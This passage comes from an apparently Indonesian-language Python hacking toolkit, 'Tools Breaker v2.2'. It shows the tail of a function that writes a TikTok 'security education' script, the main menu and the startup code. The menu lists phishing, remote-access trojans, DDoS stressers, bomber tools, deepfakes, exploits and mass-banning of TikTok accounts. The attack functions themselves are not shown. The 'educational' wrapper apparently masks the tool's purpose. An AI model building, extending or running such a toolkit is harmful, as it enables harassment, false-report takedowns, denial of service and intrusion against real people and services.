        print("TikTok melindungi kreator dengan:")
        print("   • Verifikasi report: Report dicek manual/otomatis")
        print("   • Appeal system: Kreator bisa banding")
        print("   • Counter-report: Report palsu bisa dilaporkan")
        print("   • Legal action: Pelaku bisa ditindak hukum")
        
    elif choice == "3":
        print("\\n[BEST PRACTICES FOR TIKTOK SECURITY]")
        print("Untuk melindungi akun TikTok Anda:")
        print("   1. Gunakan password yang kuat")
        print("   2. Aktifkan 2-factor authentication")
        print("   3. Hati-hati dengan phishing")
        print("   4. Laporkan penyalahgunaan")
        print("   5. Jangan bagikan login details")
    
    print("\\n[PENTING]")
    print("Penyalahgunaan tools ini dapat berakibat:")
    print("   • Akun TikTok dibanned permanen")
    print("   • Tindakan hukum")
    print("   • Denda dan konsekuensi serius")

def generate_report_example():
    """Generate contoh laporan yang benar"""
    print("\\n[CARA MELAPORKAN YANG BENAR]")
    print("\\nContoh report yang valid:")
    
    reports = [
        {
            "reason": "Kekerasan",
            "description": "Video mengandung konten kekerasan fisik",
            "evidence": "Timestamp 0:45-1:10"
        },
        {
            "reason": "Ujaran kebencian",
            "description": "Komentar mengandung ujaran kebencian terhadap kelompok tertentu",
            "evidence": "Komentar oleh user @example"
        },
        {
            "reason": "Pelecehan",
            "description": "Konten melecehkan individu tertentu",
            "evidence": "Menyebut nama dan foto tanpa izin"
        }
    ]
    
    for i, report in enumerate(reports, 1):
        print(f"\\n{i}. {report['reason']}")
        print(f"   Deskripsi: {report['description']}")
        print(f"   Bukti: {report['evidence']}")
    
    print("\\n[CATATAN]")
    print("Report hanya untuk konten yang benar-benar melanggar")
    print("Report palsu adalah pelanggaran berat")

if __name__ == "__main__":
    print("=" * 60)
    print("TIKTOK SECURITY EDUCATION TOOL")
    print("=" * 60)
    
    educational_tiktok_analysis()
    generate_report_example()
    
    print("\\n" + "=" * 60)
    print("GUNAKAN DENGAN BIJAK DAN TANGGUNG JAWAB")
    print("=" * 60)
'''

    filename = "tiktok_security_education.py"
    with open(filename, "w", encoding='utf-8') as f:
        f.write(script_content)
    
    print(colored(f"\n[EDUCATIONAL SCRIPT GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Konten: Pendidikan keamanan TikTok", 'white'))
    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    print(colored("   Tujuan: Edukasi tentang sistem keamanan TikTok", 'cyan'))
    
    save_result("tiktok.log", "Generated educational TikTok security script")
    input("\nPress Enter to continue...")

# ================== MENU UTAMA ==================
def menu_utama(username, plan):
    while True:
        os.system('clear')
        play_music()
        print_banner(username, plan)

        print(colored("╔═════════════════════════════════════════════════════╗", 'cyan', attrs=['bold']))
        print(colored("║                 < MENU UTAMA v1.0 >                 ║", 'cyan', attrs=['bold']))
        print(colored("╚═════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))
        
        # Show feature status
        features = [
            ("1  PHISING & SOCIAL ENG", "Aktif", 'white'),
            ("2  RAT & REMOTE ACCESS", "Aktif" if CRYPTO_AVAILABLE else "Need Crypto", 'green' if CRYPTO_AVAILABLE else 'yellow'),
            ("3  DDOS & STRESSER", "Aktif", 'white'),
            ("4  BOMBER TOOLS", "Aktif", 'white'),
            ("5  OSINT & TRACKING", "Aktif", 'white'),
            ("6  DEEPFAKE & IMAGE TOOLS", "Aktif" if PILLOW_AVAILABLE else "Need Pillow", 'green' if PILLOW_AVAILABLE else 'yellow'),
            ("7  ENCRYPT & DECRYPT", "Aktif" if CRYPTO_AVAILABLE else "Need Crypto", 'green' if CRYPTO_AVAILABLE else 'yellow'),
            ("8  EXPLOIT & SECURITY", "Aktif", 'white'),
            ("9  WHATSAPP INVITE", "Aktif", 'white'),
            ("10 DASHBOARD MONITORING", "Aktif", 'white'),
            ("11 DEVTOOLS", "Aktif" if IS_DEVELOPER else "Dev Only", 'green' if IS_DEVELOPER else 'red'),
            ("14 PHONE NUMBER INFO", "Aktif", 'white'),
            ("15 MASS BANNED TIKTOK", "Aktif" if SELENIUM_AVAILABLE else "Need Selenium", 'green' if SELENIUM_AVAILABLE else 'yellow')
        ]
        
        for feature, status, color in features:
            print(colored(f"║ {feature:<35} {status:<20} ║", color))
        
        print(colored("║ 0  EXIT                             Aktif                    ║", 'red'))
        print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))
        print(colored(f"Mode: LOCAL | No VPS Required | Results saved to: {RESULTS_DIR}", 'yellow'))

        ch = input(colored("\nPilih [1-15 / 0]: ", 'yellow')).strip()

        feature_map = {
            "1": fitur_1, "2": fitur_2, "3": fitur_3, "4": fitur_4, "5": fitur_5,
            "6": fitur_6, "7": fitur_7, "8": fitur_8, "9": fitur_9, "10": fitur_10,
            "11": fitur_11, "14": fitur_14, "15": fitur_15
        }
        
        if ch in feature_map:
            feature_map[ch]()
        elif ch == "0": 
            print(colored("\n[+] Exiting Tools Breaker v2.2...", 'cyan'))
            print(colored("[+] All results saved locally", 'green'))
            sys.exit(0)
        else: 
            print(colored("Pilihan tidak valid!", 'red'))
            input("Enter...")

# ================== JALANKAN ==================
if __name__ == "__main__":
    # Auto-check for updates on startup
    check_for_updates()
    
    if not os.path.exists('ua.txt'):
        print(colored("\n[!] File ua.txt tidak ditemukan!", 'yellow'))
        print(colored("[+] Membuat ua.txt dengan default User-Agents...", 'cyan'))
        
        default_ua = """Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"""
        
        with open('ua.txt', 'w') as f:
            f.write(default_ua)
        
        print(colored("[+] ua.txt created with 6 default User-Agents", 'green'))
        time.sleep(2)

    # LOGIN DULU!
    username, plan = login()

    # MASUK MENU
    menu_utama(username, plan)